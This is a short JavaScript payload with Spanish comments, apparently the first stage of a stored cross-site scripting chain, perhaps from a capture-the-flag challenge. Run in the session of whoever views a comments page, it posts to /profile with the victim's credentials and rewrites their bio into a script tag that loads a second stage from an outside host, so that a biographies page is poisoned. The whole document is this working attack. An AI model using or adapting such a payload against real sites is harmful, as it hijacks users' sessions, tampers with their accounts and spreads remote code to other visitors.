// ETAPA 1 — corre en la sesión de quien mira /comments (objetivo: Pepe, que es experto).
// Reescribe la bio del que lo ejecuta con la ETAPA 2, para envenenar su tarjeta en /biographies.
(function () {
  var fd = new FormData();
  fd.append("bio", '<script src="https://paginadepepe.vercel.app/s2.js"><\/script>');
  fetch("/profile", { method: "POST", credentials: "include", body: fd });
})();
